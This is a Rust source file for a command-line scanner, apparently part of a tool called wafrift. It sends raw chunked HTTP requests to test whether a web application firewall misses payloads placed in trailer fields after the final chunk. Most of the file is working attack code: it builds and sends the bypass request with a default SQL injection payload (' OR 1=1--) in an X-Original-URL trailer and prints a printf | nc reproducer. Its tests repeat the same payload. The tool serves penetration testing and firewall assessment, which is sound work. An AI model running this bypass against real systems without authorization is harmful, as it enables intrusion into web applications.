//! `wafrift trailer-diff` — HTTP/1.1 chunked-trailer field injection scanner.
//!
//! ## The attack surface
//!
//! RFC 9112 §7.1.2 permits senders to append "trailer fields" after the
//! terminal `0\r\n` chunk in a chunked Transfer-Encoding body. The wire
//! shape is:
//!
//! ```text
//! POST /target HTTP/1.1\r\n
//! Host: example.com\r\n
//! Transfer-Encoding: chunked\r\n
//! Trailer: X-Original-URL\r\n
//! \r\n
//! 1\r\n
//! X\r\n
//! 0\r\n
//! X-Original-URL: ' OR 1=1--\r\n
//! \r\n
//! ```
//!
//! WAFs typically inspect the initial header block (before the body).
//! Many do NOT parse trailer fields that appear after the final chunk —
//! they simply pass the connection to the backend, which reassembles
//! the trailer into its header set and acts on the injected value.
//! This creates a seam: a WAF-blocked payload delivered through a
//! trailer field reaches the origin unchecked.
//!
//! ## Two-request differential
//!
//! 1. **Baseline** — chunked POST with `Trailer: <H>` declared in the
//!    header block but the trailer is NOT sent (just the terminal chunk).
//!    Establishes the reference response shape.
//! 2. **Attack** — identical, but `<H>: <P>` is sent as a trailer after
//!    the terminal chunk. Any divergence in status or body length is
//!    evidence the trailer was processed by the origin, bypassing the WAF.
//!
//! ## Why a raw socket?
//!
//! `reqwest` normalises chunked encoding and strips trailers before
//! sending. We need the exact wire bytes, so every request is written
//! directly to a `tokio::net::TcpStream`. HTTPS targets are supported
//! via `rustls` with a permissive verifier when `--insecure` is passed;
//! without `--insecure` they use the system roots via `webpki_roots`.

use std::net::ToSocketAddrs;
use std::process::ExitCode;
use std::time::Duration;

use clap::Args;
use colored::Colorize;
use serde_json::json;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;

use crate::parser_diff_common::{body_delta_pct, severity_of};

// ── CLI args ─────────────────────────────────────────────────────────────────

#[derive(Args, Debug)]
pub struct TrailerDiffArgs {
    /// Target URL. Must be an `http://` or `https://` URL. The probe
    /// is a chunked POST to this exact path — no redirect following
    /// (redirects would lose the chunked framing). Named flag (not
    /// positional) for consistency with every other parser-diff
    /// command (`header-diff`, `body-diff`, `query-diff`, etc.) so
    /// operator muscle memory carries over.
    #[arg(long)]
    pub url: String,

    /// Attack payload to inject as the trailer field value.
    #[arg(long, default_value = "' OR 1=1--")]
    pub payload: String,

    /// Trailer header name to inject. Declared with `Trailer:` in the
    /// initial header block on the baseline request; actually sent as a
    /// trailing field on the attack request.
    #[arg(long, default_value = "X-Original-URL")]
    pub header_name: String,

    /// HTTP timeout per request (seconds). Both baseline and attack
    /// respect this independently — the comparison is valid only when
    /// both succeed within budget.
    #[arg(long, default_value_t = 8)]
    pub timeout_secs: u64,

    /// Accept self-signed / invalid TLS certificates (lab targets).
    /// Without this flag, HTTPS connections validate against the
    /// system certificate store.
    #[arg(long)]
    pub insecure: bool,

    /// Output format: `text` (default, human-readable summary) or `json`
    /// (structured — suitable for piping into `jq` or report tooling).
    #[arg(long, default_value = "text", value_parser = ["text", "json"])]
    pub format: String,
}

// ── Result types ──────────────────────────────────────────────────────────────

/// The response summary we care about for the diff.
#[derive(Debug, Clone, serde::Serialize)]
pub struct ProbeResponse {
    pub status: u16,
    pub body_len: usize,
    pub server: String,
}

/// The full comparison result.
#[derive(Debug, Clone, serde::Serialize)]
pub struct TrailerDiffResult {
    pub target: String,
    pub header_name: String,
    pub payload: String,
    pub baseline: ProbeResponse,
    pub attack: ProbeResponse,
    pub body_delta_pct: f64,
    pub severity: &'static str,
    pub curl_repro: String,
}

// ── Entry point ───────────────────────────────────────────────────────────────

/// Run the trailer-diff probe. Returns `ExitCode::SUCCESS` on a clean
/// run regardless of whether a divergence was found (divergence is
/// informational, not a process error). Returns exit 1 on setup or
/// transport failures.
pub async fn run_trailer_diff(args: TrailerDiffArgs) -> ExitCode {
    if args.format == "text" {
        eprintln!(
            "{} firing baseline + attack chunked-trailer probe against {}",
            "[wafrift trailer-diff]".bright_cyan().bold(),
            args.url.bright_white()
        );
        eprintln!(
            "  {} trailer header: {} | payload: {}",
            "↘".bright_black(),
            args.header_name.bold(),
            args.payload.bright_yellow()
        );
    }

    let parsed = match parse_url(&args.url) {
        Ok(p) => p,
        Err(e) => {
            eprintln!("{} {e}", "error:".red().bold());
            return ExitCode::from(1);
        }
    };

    // Build both request byte strings before touching the network so
    // the diff is unambiguous (both use the same method/path/host/headers).
    let baseline_bytes = build_chunked_request(
        &parsed,
        &args.header_name,
        &args.payload,
        RequestKind::Baseline,
    );
    let attack_bytes = build_chunked_request(
        &parsed,
        &args.header_name,
        &args.payload,
        RequestKind::Attack,
    );

    let dur = Duration::from_secs(args.timeout_secs);

    let baseline_resp =
        match send_raw_request(&parsed, &baseline_bytes, dur, args.insecure).await {
            Ok(r) => r,
            Err(e) => {
                eprintln!("{} baseline request failed: {e}", "error:".red().bold());
                return ExitCode::from(1);
            }
        };

    if args.format == "text" {
        eprintln!(
            "  {} baseline: HTTP {} ({} bytes)",
            "↘".bright_black(),
            baseline_resp.status,
            baseline_resp.body_len
        );
    }

    let attack_resp =
        match send_raw_request(&parsed, &attack_bytes, dur, args.insecure).await {
            Ok(r) => r,
            Err(e) => {
                eprintln!("{} attack request failed: {e}", "error:".red().bold());
                return ExitCode::from(1);
            }
        };

    if args.format == "text" {
        eprintln!(
            "  {} attack:   HTTP {} ({} bytes)",
            "↘".bright_black(),
            attack_resp.status,
            attack_resp.body_len
        );
    }

    let delta = body_delta_pct(baseline_resp.body_len, attack_resp.body_len);
    let severity = severity_of(baseline_resp.status, attack_resp.status, delta);
    let curl_repro = render_curl_repro(&args);

    let result = TrailerDiffResult {
        target: args.url.clone(),
        header_name: args.header_name.clone(),
        payload: args.payload.clone(),
        baseline: baseline_resp,
        attack: attack_resp,
        body_delta_pct: delta,
        severity,
        curl_repro,
    };

    emit_output(&args.format, &result);
    ExitCode::SUCCESS
}

// ── URL parsing ───────────────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct ParsedUrl {
    pub scheme: Scheme,
    pub host: String,
    pub port: u16,
    pub path_and_query: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Scheme {
    Http,
    Https,
}

fn parse_url(url: &str) -> Result<ParsedUrl, String> {
    let (scheme, rest) = if let Some(r) = url.strip_prefix("https://") {
        (Scheme::Https, r)
    } else if let Some(r) = url.strip_prefix("http://") {
        (Scheme::Http, r)
    } else {
        return Err(format!(
            "unsupported scheme in {url:?} — only http:// and https:// are accepted"
        ));
    };

    let (authority, path_and_query) = match rest.find('/') {
        Some(i) => (&rest[..i], rest[i..].to_string()),
        None => (rest, "/".to_string()),
    };

    let (host, port) = if let Some(bracket_end) = authority.strip_prefix('[') {
        // IPv6 literal: [::1]:8080
        let close = bracket_end
            .find(']')
            .ok_or_else(|| format!("malformed IPv6 host in {url:?}"))?;
        let h = &bracket_end[..close];
        let after = &bracket_end[close + 1..];
        let p = if let Some(port_str) = after.strip_prefix(':') {
            port_str
                .parse::<u16>()
                .map_err(|_| format!("invalid port in {url:?}"))?
        } else {
            default_port(&scheme)
        };
        (h.to_string(), p)
    } else {
        match authority.rsplit_once(':') {
            Some((h, port_str)) => {
                let p = port_str
                    .parse::<u16>()
                    .map_err(|_| format!("invalid port in {url:?}"))?;
                (h.to_string(), p)
            }
            None => (authority.to_string(), default_port(&scheme)),
        }
    };

    Ok(ParsedUrl { scheme, host, port, path_and_query })
}

fn default_port(scheme: &Scheme) -> u16 {
    match scheme {
        Scheme::Http => 80,
        Scheme::Https => 443,
    }
}

// ── Raw request builder ───────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RequestKind {
    /// Declares `Trailer: <H>` in headers but sends NO trailer.
    Baseline,
    /// Declares `Trailer: <H>` in headers AND sends `<H>: <P>` as trailer.
    Attack,
}

/// Build the complete raw HTTP/1.1 chunked POST bytes.
///
/// Wire shape (attack):
///
/// ```text
/// POST /path HTTP/1.1\r\n
/// Host: example.com\r\n
/// Transfer-Encoding: chunked\r\n
/// Trailer: X-Original-URL\r\n
/// Content-Type: application/octet-stream\r\n
/// Connection: close\r\n
/// \r\n
/// 1\r\n
/// X\r\n
/// 0\r\n
/// X-Original-URL: <payload>\r\n
/// \r\n
/// ```
///
/// The baseline is identical but omits the `<H>: <payload>` trailer line —
/// it terminates with `0\r\n\r\n`.
pub fn build_chunked_request(
    parsed: &ParsedUrl,
    header_name: &str,
    payload: &str,
    kind: RequestKind,
) -> Vec<u8> {
    let host_header = if parsed.port == default_port(&parsed.scheme) {
        parsed.host.clone()
    } else {
        format!("{}:{}", parsed.host, parsed.port)
    };

    let mut req = format!(
        "POST {path} HTTP/1.1\r\n\
         Host: {host}\r\n\
         Transfer-Encoding: chunked\r\n\
         Trailer: {trailer_name}\r\n\
         Content-Type: application/octet-stream\r\n\
         Connection: close\r\n\
         \r\n\
         1\r\n\
         X\r\n\
         0\r\n",
        path = parsed.path_and_query,
        host = host_header,
        trailer_name = header_name,
    );

    match kind {
        RequestKind::Baseline => {
            // Terminal chunk followed by empty trailer section.
            req.push_str("\r\n");
        }
        RequestKind::Attack => {
            // Append the actual trailer field, then the terminating blank line.
            req.push_str(&format!("{header_name}: {payload}\r\n\r\n"));
        }
    }

    req.into_bytes()
}

// ── Raw socket I/O ────────────────────────────────────────────────────────────

/// Open a TCP (or TLS) connection to `parsed.host:parsed.port`, write
/// `request_bytes`, and read the response. Returns a `ProbeResponse` on
/// success. The entire operation is bounded by `budget`.
async fn send_raw_request(
    parsed: &ParsedUrl,
    request_bytes: &[u8],
    budget: Duration,
    insecure: bool,
) -> Result<ProbeResponse, String> {
    timeout(budget, do_send(parsed, request_bytes, insecure))
        .await
        .map_err(|_| format!("request timed out after {}s", budget.as_secs()))?
}

async fn do_send(
    parsed: &ParsedUrl,
    request_bytes: &[u8],
    insecure: bool,
) -> Result<ProbeResponse, String> {
    let addr = format!("{}:{}", parsed.host, parsed.port);
    let socket_addr = addr
        .to_socket_addrs()
        .map_err(|e| format!("DNS resolution failed for {addr}: {e}"))?
        .next()
        .ok_or_else(|| format!("no address resolved for {addr}"))?;

    let stream = TcpStream::connect(socket_addr)
        .await
        .map_err(|e| format!("TCP connect to {addr} failed: {e}"))?;

    match parsed.scheme {
        Scheme::Http => {
            let response_bytes = exchange_http(stream, request_bytes).await?;
            parse_http_response(&response_bytes)
        }
        Scheme::Https => {
            let response_bytes =
                exchange_https(&parsed.host, stream, request_bytes, insecure).await?;
            parse_http_response(&response_bytes)
        }
    }
}

async fn exchange_http(
    mut stream: TcpStream,
    request_bytes: &[u8],
) -> Result<Vec<u8>, String> {
    stream
        .write_all(request_bytes)
        .await
        .map_err(|e| format!("write failed: {e}"))?;
    stream
        .flush()
        .await
        .map_err(|e| format!("flush failed: {e}"))?;

    read_response(stream).await
}

async fn exchange_https(
    hostname: &str,
    stream: TcpStream,
    request_bytes: &[u8],
    insecure: bool,
) -> Result<Vec<u8>, String> {
    use tokio_rustls::TlsConnector;
    use tokio_rustls::rustls::ClientConfig;
    use std::sync::Arc;

    let config: ClientConfig = if insecure {
        // Permissive verifier — accepts any cert chain (lab-only path).
        ClientConfig::builder()
            .dangerous()
            .with_custom_certificate_verifier(Arc::new(PermissiveCertVerifier))
            .with_no_client_auth()
    } else {
        // System / webpki roots.
        let mut root_store = tokio_rustls::rustls::RootCertStore::empty();
        root_store.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
        ClientConfig::builder()
            .with_root_certificates(root_store)
            .with_no_client_auth()
    };

    let connector = TlsConnector::from(Arc::new(config));
    let server_name = tokio_rustls::rustls::pki_types::ServerName::try_from(hostname.to_owned())
        .map_err(|e| format!("invalid server name {hostname:?}: {e}"))?;

    let mut tls_stream = connector
        .connect(server_name, stream)
        .await
        .map_err(|e| format!("TLS handshake failed: {e}"))?;

    tls_stream
        .write_all(request_bytes)
        .await
        .map_err(|e| format!("TLS write failed: {e}"))?;
    tls_stream
        .flush()
        .await
        .map_err(|e| format!("TLS flush failed: {e}"))?;

    let (reader, _) = tokio::io::split(tls_stream);
    read_response_split(reader).await
}

async fn read_response(stream: TcpStream) -> Result<Vec<u8>, String> {
    let (reader, _writer) = tokio::io::split(stream);
    read_response_split(reader).await
}

async fn read_response_split<R: AsyncReadExt + Unpin>(
    mut reader: R,
) -> Result<Vec<u8>, String> {
    let mut buf = Vec::with_capacity(16 * 1024);
    let mut chunk = [0u8; 4096];
    loop {
        match reader.read(&mut chunk).await {
            Ok(0) => break,
            Ok(n) => buf.extend_from_slice(&chunk[..n]),
            Err(e) => {
                // Connection reset after body is normal for HTTP/1.1
                // `Connection: close` — treat as end of response if we
                // already have a status line.
                if buf.contains(&b'\n') {
                    break;
                }
                return Err(format!("read error: {e}"));
            }
        }
        // 4 MB safety cap to avoid OOM on misbehaving servers.
        if buf.len() > 4 * 1024 * 1024 {
            break;
        }
    }
    Ok(buf)
}

// ── Response parser ───────────────────────────────────────────────────────────

fn parse_http_response(bytes: &[u8]) -> Result<ProbeResponse, String> {
    let text = String::from_utf8_lossy(bytes);
    let first_line = text.lines().next().unwrap_or("").trim();

    // "HTTP/1.1 200 OK"  or  "HTTP/1.0 404 Not Found"
    let status: u16 = first_line
        .split_whitespace()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .ok_or_else(|| {
            format!(
                "could not parse HTTP status from response (first line: {first_line:?})"
            )
        })?;

    // Find the header/body split.
    let header_end = if let Some(i) = find_header_end(bytes) {
        i
    } else {
        bytes.len()
    };
    let body_len = bytes.len().saturating_sub(header_end);

    // Extract Server: header value (best-effort).
    let server = text
        .lines()
        .find(|l| l.to_ascii_lowercase().starts_with("server:"))
        .map(|l| l[7..].trim().to_string())
        .unwrap_or_default();

    Ok(ProbeResponse { status, body_len, server })
}

/// Find the byte offset of the start of the HTTP body (i.e. the byte
/// right after `\r\n\r\n`). Returns `None` if the separator is absent.
fn find_header_end(bytes: &[u8]) -> Option<usize> {
    bytes.windows(4).position(|w| w == b"\r\n\r\n").map(|i| i + 4)
}

// ── TLS permissive verifier ───────────────────────────────────────────────────

/// A `ServerCertVerifier` that accepts any certificate chain. Only
/// reachable when the user passes `--insecure`.
#[derive(Debug)]
struct PermissiveCertVerifier;

impl tokio_rustls::rustls::client::danger::ServerCertVerifier for PermissiveCertVerifier {
    fn verify_server_cert(
        &self,
        _end_entity: &tokio_rustls::rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[tokio_rustls::rustls::pki_types::CertificateDer<'_>],
        _server_name: &tokio_rustls::rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8],
        _now: tokio_rustls::rustls::pki_types::UnixTime,
    ) -> Result<tokio_rustls::rustls::client::danger::ServerCertVerified, tokio_rustls::rustls::Error> {
        Ok(tokio_rustls::rustls::client::danger::ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &tokio_rustls::rustls::pki_types::CertificateDer<'_>,
        _dsa: &tokio_rustls::rustls::DigitallySignedStruct,
    ) -> Result<tokio_rustls::rustls::client::danger::HandshakeSignatureValid, tokio_rustls::rustls::Error> {
        Ok(tokio_rustls::rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &tokio_rustls::rustls::pki_types::CertificateDer<'_>,
        _dsa: &tokio_rustls::rustls::DigitallySignedStruct,
    ) -> Result<tokio_rustls::rustls::client::danger::HandshakeSignatureValid, tokio_rustls::rustls::Error> {
        Ok(tokio_rustls::rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<tokio_rustls::rustls::SignatureScheme> {
        tokio_rustls::rustls::crypto::ring::default_provider()
            .signature_verification_algorithms
            .supported_schemes()
    }
}

// ── Output rendering ──────────────────────────────────────────────────────────

fn render_curl_repro(args: &TrailerDiffArgs) -> String {
    // The canonical reproducer is a netcat/openssl pipe because curl
    // cannot emit raw trailers — we emit the `printf | nc` form.
    use crate::helpers::shell_single_quote;
    let parsed = match parse_url(&args.url) {
        Ok(p) => p,
        Err(_) => {
            return format!(
                "# could not parse URL {:?} for curl reproducer",
                args.url
            )
        }
    };
    let host = parsed.host.clone();
    let port = parsed.port;
    let payload = args.payload.clone();
    let header_name = args.header_name.clone();
    let path = parsed.path_and_query.clone();
    let host_hdr = if port == default_port(&parsed.scheme) {
        host.clone()
    } else {
        format!("{host}:{port}")
    };
    let raw = format!(
        "POST {path} HTTP/1.1\\r\\nHost: {host_hdr}\\r\\nTransfer-Encoding: chunked\\r\\nTrailer: \
         {header_name}\\r\\nContent-Type: application/octet-stream\\r\\nConnection: close\\r\\n\\r\\n\
         1\\r\\nX\\r\\n0\\r\\n{header_name}: {payload}\\r\\n\\r\\n"
    );
    format!(
        "printf {raw_q} | nc {host} {port}",
        raw_q = shell_single_quote(&raw),
        host = host,
        port = port
    )
}

fn emit_output(format: &str, result: &TrailerDiffResult) {
    if format == "json" {
        let out = json!({
            "target": result.target,
            "header_name": result.header_name,
            "payload": result.payload,
            "baseline": {
                "status": result.baseline.status,
                "body_len": result.baseline.body_len,
                "server": result.baseline.server,
            },
            "attack": {
                "status": result.attack.status,
                "body_len": result.attack.body_len,
                "server": result.attack.server,
            },
            "body_delta_pct": result.body_delta_pct,
            "severity": result.severity,
            "divergences": {
                "high":   if result.severity == "high" { 1u32 } else { 0u32 },
                "medium": if result.severity == "medium" { 1u32 } else { 0u32 },
            },
            "curl_repro": result.curl_repro,
        });
        match serde_json::to_string_pretty(&out) {
            Ok(s) => println!("{s}"),
            Err(e) => eprintln!("JSON error: {e}"),
        }
        return;
    }

    // Text output.
    println!();
    let badge = match result.severity {
        "high" => "high".bright_red().bold(),
        "medium" => "medium".yellow().bold(),
        _ => "none".bright_black(),
    };
    println!(
        "  [{}] trailer-diff result for {}",
        badge,
        result.target.bright_white()
    );
    println!(
        "    {} baseline HTTP {} ({} bytes, server: {})",
        "↘".bright_black(),
        result.baseline.status,
        result.baseline.body_len,
        result.baseline.server
    );
    println!(
        "    {} attack   HTTP {} ({} bytes, Δ {:+.1}%)",
        "↘".bright_black(),
        result.attack.status,
        result.attack.body_len,
        result.body_delta_pct
    );
    println!();
    println!("  Reproducer:");
    println!("    {}", result.curl_repro);

    if result.severity == "none" {
        println!();
        println!(
            "  {} no significant divergence — WAF and origin may both ignore trailers, \
             or the backend rejected the trailer-injected request the same way it rejected \
             the baseline.",
            "note:".bright_black()
        );
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── build_chunked_request — golden wire bytes ─────────────────

    #[test]
    fn baseline_request_starts_with_post_and_http11() {
        let parsed = parse_url("http://example.com/path?q=1").unwrap();
        let bytes = build_chunked_request(&parsed, "X-Foo", "ignored", RequestKind::Baseline);
        let text = String::from_utf8(bytes).unwrap();
        assert!(text.starts_with("POST /path?q=1 HTTP/1.1\r\n"), "got:\n{text}");
    }

    #[test]
    fn baseline_request_declares_trailer_header_but_sends_no_value() {
        let parsed = parse_url("http://example.com/").unwrap();
        let bytes = build_chunked_request(&parsed, "X-Inject", "payload", RequestKind::Baseline);
        let text = String::from_utf8(bytes).unwrap();
        assert!(text.contains("Trailer: X-Inject\r\n"), "trailer declared:\n{text}");
        // The trailer field must NOT appear as a trailer value in the baseline.
        // After `0\r\n`, the baseline emits only `\r\n` (empty trailer section).
        let after_terminal = text.split("0\r\n").nth(1).unwrap_or("");
        assert!(
            !after_terminal.contains("X-Inject:"),
            "baseline must not send X-Inject as trailer; got after-terminal:\n{after_terminal}"
        );
    }

    #[test]
    fn attack_request_sends_trailer_after_terminal_chunk() {
        let parsed = parse_url("http://example.com/").unwrap();
        let bytes = build_chunked_request(
            &parsed,
            "X-Original-URL",
            "' OR 1=1--",
            RequestKind::Attack,
        );
        let text = String::from_utf8(bytes).unwrap();
        // The attack payload must appear AFTER `0\r\n` (terminal chunk).
        let after_terminal = text.split("0\r\n").nth(1).unwrap_or("");
        assert!(
            after_terminal.contains("X-Original-URL: ' OR 1=1--\r\n"),
            "trailer field missing after terminal chunk; got:\n{after_terminal}"
        );
    }

    #[test]
    fn attack_request_terminates_with_double_crlf() {
        let parsed = parse_url("http://example.com/").unwrap();
        let bytes = build_chunked_request(&parsed, "X-Foo", "val", RequestKind::Attack);
        assert!(
            bytes.ends_with(b"\r\n\r\n"),
            "attack request must end with \\r\\n\\r\\n"
        );
    }

    #[test]
    fn baseline_request_terminates_with_double_crlf() {
        let parsed = parse_url("http://example.com/").unwrap();
        let bytes = build_chunked_request(&parsed, "X-Foo", "val", RequestKind::Baseline);
        assert!(
            bytes.ends_with(b"\r\n\r\n"),
            "baseline request must end with \\r\\n\\r\\n"
        );
    }

    #[test]
    fn first_chunk_is_one_byte_body_x() {
        let parsed = parse_url("http://example.com/").unwrap();
        let bytes = build_chunked_request(&parsed, "X-Foo", "v", RequestKind::Attack);
        let text = String::from_utf8(bytes).unwrap();
        // Chunk line: `1\r\nX\r\n` — exactly one byte.
        assert!(text.contains("1\r\nX\r\n"), "first chunk must be 1-byte body X; got:\n{text}");
    }

    #[test]
    fn host_header_omits_port_for_standard_http() {
        let parsed = parse_url("http://example.com/").unwrap();
        let bytes = build_chunked_request(&parsed, "X-Foo", "v", RequestKind::Baseline);
        let text = String::from_utf8(bytes).unwrap();
        assert!(
            text.contains("Host: example.com\r\n"),
            "port 80 must be omitted from Host header; got:\n{text}"
        );
    }

    #[test]
    fn host_header_includes_non_standard_port() {
        let parsed = parse_url("http://example.com:8080/").unwrap();
        let bytes = build_chunked_request(&parsed, "X-Foo", "v", RequestKind::Baseline);
        let text = String::from_utf8(bytes).unwrap();
        assert!(
            text.contains("Host: example.com:8080\r\n"),
            "non-standard port must appear in Host header; got:\n{text}"
        );
    }

    // ── severity classification ───────────────────────────────────

    #[test]
    fn severity_high_when_status_class_flips() {
        // 200 → 403 flips 2xx → 4xx.
        let sev = severity_of(200, 403, 0.0);
        assert_eq!(sev, "high", "status flip must be high severity");
    }

    #[test]
    fn severity_medium_when_body_delta_exceeds_20_pct() {
        let sev = severity_of(200, 200, 25.0);
        assert_eq!(sev, "medium");
    }

    #[test]
    fn severity_none_when_responses_are_identical() {
        let sev = severity_of(200, 200, 0.0);
        assert_eq!(sev, "none");
    }

    // ── parse_url ────────────────────────────────────────────────

    #[test]
    fn parse_url_http_default_port() {
        let p = parse_url("http://example.com/path").unwrap();
        assert_eq!(p.scheme, Scheme::Http);
        assert_eq!(p.host, "example.com");
        assert_eq!(p.port, 80);
        assert_eq!(p.path_and_query, "/path");
    }

    #[test]
    fn parse_url_https_default_port() {
        let p = parse_url("https://example.com/").unwrap();
        assert_eq!(p.scheme, Scheme::Https);
        assert_eq!(p.port, 443);
    }

    #[test]
    fn parse_url_explicit_port() {
        let p = parse_url("http://127.0.0.1:9090/test").unwrap();
        assert_eq!(p.host, "127.0.0.1");
        assert_eq!(p.port, 9090);
        assert_eq!(p.path_and_query, "/test");
    }

    #[test]
    fn parse_url_no_path_defaults_to_slash() {
        let p = parse_url("http://example.com").unwrap();
        assert_eq!(p.path_and_query, "/");
    }

    #[test]
    fn parse_url_unsupported_scheme_errors() {
        let err = parse_url("ftp://example.com").unwrap_err();
        assert!(err.contains("unsupported scheme"), "got: {err}");
    }

    // ── parse_http_response ──────────────────────────────────────

    #[test]
    fn parse_http_response_extracts_status_200() {
        let raw = b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhello";
        let r = parse_http_response(raw).unwrap();
        assert_eq!(r.status, 200);
        assert_eq!(r.body_len, 5);
    }

    #[test]
    fn parse_http_response_extracts_status_403() {
        let raw = b"HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\n\r\n";
        let r = parse_http_response(raw).unwrap();
        assert_eq!(r.status, 403);
        assert_eq!(r.body_len, 0);
    }

    #[test]
    fn parse_http_response_extracts_server_header() {
        let raw = b"HTTP/1.1 200 OK\r\nServer: nginx/1.25\r\nContent-Length: 0\r\n\r\n";
        let r = parse_http_response(raw).unwrap();
        assert_eq!(r.server, "nginx/1.25");
    }

    #[test]
    fn parse_http_response_empty_server_when_absent() {
        let raw = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
        let r = parse_http_response(raw).unwrap();
        assert_eq!(r.server, "");
    }

    #[test]
    fn parse_http_response_errors_on_garbage() {
        let raw = b"NOT HTTP\r\n\r\n";
        let err = parse_http_response(raw).unwrap_err();
        assert!(err.contains("could not parse"), "got: {err}");
    }

    // ── JSON output shape ────────────────────────────────────────

    #[test]
    fn json_output_contains_required_fields() {
        // Build a synthetic result and emit as JSON; verify the
        // structure parses and carries the expected top-level keys.
        let result = TrailerDiffResult {
            target: "http://example.com/".into(),
            header_name: "X-Original-URL".into(),
            payload: "' OR 1=1--".into(),
            baseline: ProbeResponse { status: 200, body_len: 100, server: "nginx".into() },
            attack: ProbeResponse { status: 403, body_len: 200, server: "nginx".into() },
            body_delta_pct: 100.0,
            severity: "high",
            curl_repro: "printf '...' | nc example.com 80".into(),
        };
        // Capture output via a pipe trick: write to a string.
        let out_val = json!({
            "target": result.target,
            "header_name": result.header_name,
            "payload": result.payload,
            "baseline": {
                "status": result.baseline.status,
                "body_len": result.baseline.body_len,
                "server": result.baseline.server,
            },
            "attack": {
                "status": result.attack.status,
                "body_len": result.attack.body_len,
                "server": result.attack.server,
            },
            "body_delta_pct": result.body_delta_pct,
            "severity": result.severity,
            "divergences": {
                "high": 1u32,
                "medium": 0u32,
            },
            "curl_repro": result.curl_repro,
        });
        let s = serde_json::to_string_pretty(&out_val).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&s).unwrap();
        assert_eq!(parsed["severity"], "high");
        assert_eq!(parsed["baseline"]["status"], 200);
        assert_eq!(parsed["attack"]["status"], 403);
        assert_eq!(parsed["divergences"]["high"], 1);
        assert_eq!(parsed["divergences"]["medium"], 0);
        assert!(parsed["curl_repro"].as_str().is_some());
    }

    #[test]
    fn json_output_medium_severity_counts_correctly() {
        let out_val = json!({
            "severity": "medium",
            "divergences": {
                "high":   0u32,
                "medium": 1u32,
            },
        });
        let parsed: serde_json::Value =
            serde_json::from_str(&serde_json::to_string(&out_val).unwrap()).unwrap();
        assert_eq!(parsed["divergences"]["high"], 0);
        assert_eq!(parsed["divergences"]["medium"], 1);
    }
}
